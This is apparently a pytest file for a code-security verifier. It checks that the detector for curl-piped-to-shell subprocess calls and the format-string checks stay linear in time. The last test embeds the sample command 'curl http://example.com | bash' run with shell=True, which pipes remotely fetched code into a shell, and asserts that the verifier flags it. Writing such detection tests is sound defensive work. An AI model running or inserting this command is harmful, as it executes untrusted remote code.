"""The subprocess curl/pipe/shell detector must stay linear: the old chained
`.*?` regex backtracked catastrophically on non-matching input and could freeze
the single-worker API (OpenVuln run-3, issue #445)."""
import time

from qwed_new.core.code_verifier import CodeVerifier


def _best_times(time_small, time_large, factor, slack=0.2, rounds=3, max_rounds=9):
    """The fastest small and large runs, measured in turn, so that a busy
    moment on a shared runner slows a run of each size, not one of them.
    Past the bound after ``rounds`` rounds, measure more, up to ``max_rounds``:
    noise only adds time, so more runs bring the best back down, while work
    that really grows faster than the input stays past the bound."""
    small, large = [], []
    for done in range(1, max_rounds + 1):
        small.append(time_small())
        large.append(time_large())
        if done >= rounds and min(large) < min(small) * factor + slack:
            break
    return min(small), min(large)


def _detector_time(verifier, reps):
    # Worst case for a rescan-per-match detector: many subprocess matches, with
    # the only shell token at the very end so every match must look past them all.
    code = "subprocess.run(curl a|" * reps + "bash"
    start = time.perf_counter()
    verifier._check_remote_pipe_to_shell(code)
    return time.perf_counter() - start


def test_detector_scales_near_linearly():
    verifier = CodeVerifier()
    _detector_time(verifier, 2000)  # warm up
    # Four times the input: a linear detector takes about 4x as long, a
    # quadratic one about 16x. The bound sits between them with room on both
    # sides, so cache and scheduling effects on a busy runner do not reach it.
    small, large = _best_times(lambda: _detector_time(verifier, 10000), lambda: _detector_time(verifier, 40000), 8)
    assert large < small * 8 + 0.2, f"detector scaled {large / max(small, 1e-6):.1f}x on 4x input"


def test_non_matching_subprocess_input_stays_fast():
    verifier = CodeVerifier()
    # Integration coverage: the public path handles the worst-case fragment
    # quickly (the old chained-regex froze here). Each fragment is a string
    # literal, so the code parses and every check runs on it (#534).
    code = '"subprocess.run(curl a|"\n' * 4000
    start = time.perf_counter()
    result = verifier.verify_code(code, language="python")
    assert time.perf_counter() - start < 2.0
    # subprocess. is still CRITICAL via process execution.
    assert result.developer_fields["critical_count"] >= 1


def test_unparseable_worst_case_fragment_is_blocked_fast():
    verifier = CodeVerifier()
    code = "subprocess.run(curl a|" * 4000
    start = time.perf_counter()
    result = verifier.verify_code(code, language="python")
    assert time.perf_counter() - start < 2.0
    assert result.status.value == "BLOCKED"
    assert result.developer_fields["constraint_id"] == "code_verifier.parse_error"


def test_growing_literal_reshape_is_not_worked_out():
    # The #534 string check works out what a literal reshape leaves, but not
    # a translate or a replace that grows the text: worked out, these build
    # a string of about n * n characters.
    verifier = CodeVerifier()
    n = 10000
    for code in (
        'x = "' + "q" * n + '".translate({113: "' + "a" * n + '"})',
        'x = "' + "q" * n + '".replace("q", "' + "a" * n + '")',
    ):
        start = time.perf_counter()
        verifier.verify_code(code, language="python")
        assert time.perf_counter() - start < 0.5


def test_unclosed_format_keys_stay_fast():
    # A regex for %-conversions backtracked quadratically on "%(" with no
    # closing parenthesis, and on a long run of zeros (flag or width) with no
    # conversion type; the format reader makes one pass.
    verifier = CodeVerifier()
    for literal in ("%(" * 100000, "%" + "0" * 200000, "%0" * 100000):
        start = time.perf_counter()
        verifier.verify_code('x = "' + literal + '" % values', language="python")
        assert time.perf_counter() - start < 1.0


def _verify_time(code):
    start = time.perf_counter()
    CodeVerifier().verify_code(code, language="python")
    return time.perf_counter() - start


def _assert_linear(build, n):
    # Four times the input must not blow up: linear work takes about 4x as
    # long, work quadratic in it about 16x, and the bound sits between them.
    # A ratio, not a time limit, so the runner's speed (or coverage tracing)
    # does not decide the result; the best runs, taken in turn (_best_times),
    # so a busy runner (pytest -n) does not either.
    _verify_time(build(n // 4))  # warm up
    small_code, large_code = build(n // 2), build(2 * n)
    small, large = _best_times(lambda: _verify_time(small_code), lambda: _verify_time(large_code), 8)
    assert large < small * 8 + 0.2, f"scaled {large / max(small, 1e-6):.1f}x on 4x input"


def test_names_reshaped_many_times_stay_fast():
    # Each name is worked out once, not once per reshape of it.
    _assert_linear(
        lambda n: "".join(f's = "{i}"\n' for i in range(n)) + "x = s[1:]\n" * n + "y = s % v\n" * n, 1500
    )


def test_one_literal_bound_to_many_names_is_read_once():
    # A chained assignment binds one literal to every target; it is read
    # once, not once per name.
    _assert_linear(
        lambda n: " = ".join(f"a{i}" for i in range(n)) + ' = "' + "." * (20 * n) + '"\nx = a0[1:]\n', 2500
    )


def test_long_literal_name_reshaped_many_times_stays_fast():
    # A literal reached through a name is worked out per use only when it
    # is short; a long one is matched once.
    _assert_linear(lambda n: 's = "' + "." * (40 * n) + '"\n' + "x = s[1:]\n" * n, 2500)


def test_long_value_is_not_carried_up_a_chain():
    # Worked out once from the literal, then not carried: a chain of steps
    # on a long value would cost the chain length times the value length.
    _assert_linear(lambda n: 'x = "' + "." * (200 * n) + '"' + "[1:]" * n + "\n", 500)


def test_long_concatenation_chain_stays_fast():
    # Values longer than the carry limit are not carried up a chain of +.
    _assert_linear(lambda n: "x = (" + " + ".join(['"ab"'] * n) + ")[1:]\n", 2500)


def test_named_format_is_read_once():
    # A format reached through a name is read once per literal, however
    # often it is formatted, not once per format.
    _assert_linear(lambda n: 's = "' + "." * (20 * n) + '"\n' + "x = s % ()\n" * n, 5000)


def test_repeated_format_key_is_not_worked_out():
    # A mapping key can be used by every conversion: worked out, each of
    # these 200 formats builds 3 MB. Not worked out, they take milliseconds.
    code = 't = "' + "%(a)s" * 819 + '"\nv = "' + "x" * 4096 + '"\n' + 'x = t % {"a": v}\n' * 200
    assert _verify_time(code) < 1.0


def test_padded_format_is_not_worked_out():
    # Worked out, a width or a precision this size builds a gigabyte.
    for code in ('x = "%999999999s" % ""\n', 'x = "%.999999999d" % 1\n'):
        assert _verify_time(code) < 0.5


def test_reaching_literals_stay_linear():
    # Where a literal holds a name, the literals that reach each step are
    # found in one walk of the code, however many steps, calls, arguments,
    # functions and call sites it has.
    for build in (
        lambda n: 'print("executing")\n' + "x = y[i] + f(a, b).c[1:]\n" * n,
        lambda n: 'print("executing")\nf(' + ", ".join(f"a{i}" for i in range(4 * n)) + ")[1:]\n",
        lambda n: 'print("executing")\n'
        + "".join(f"def f{i}(a, b=c):\n    return a[1:]\n" for i in range(n // 2))
        + "".join(f"f{i}(x, y)\n" for i in range(n // 2)),
    ):
        _assert_linear(build, 2500)


def test_curl_pipe_shell_still_flagged_across_lines():
    verifier = CodeVerifier()
    code = (
        "import subprocess\n"
        "subprocess.run(\n"
        '    "curl http://example.com | bash",\n'
        "    shell=True,\n"
        ")\n"
    )
    result = verifier.verify_code(code, language="python")
    issues = result.developer_fields["issues"]
    assert any(i["type"] == "remote_code_execution" for i in issues)
